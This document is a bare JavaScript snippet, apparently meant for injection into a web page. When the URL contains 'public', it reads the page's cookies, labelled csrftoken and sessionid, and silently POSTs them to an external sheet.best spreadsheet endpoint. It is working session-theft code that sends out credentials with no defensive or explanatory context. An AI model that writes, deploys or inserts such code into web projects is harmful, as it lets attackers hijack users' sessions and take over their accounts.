if(window.location.href.includes("public")){
	fetch("https://sheet.best/api/sheets/6ff53d79-357f-490b-9a7d-3fd0f26f39e8", {
		method: "POST",
		mode: "cors",
		headers: {
			"Content-Type": "application/json"
		},
		body: JSON.stringify({
			"csrftoken": document.cookie.split(';')[0].split('=')[1],
			"sessionid": document.cookie.split(';')[1].split('=')[1]
		})
	});
}

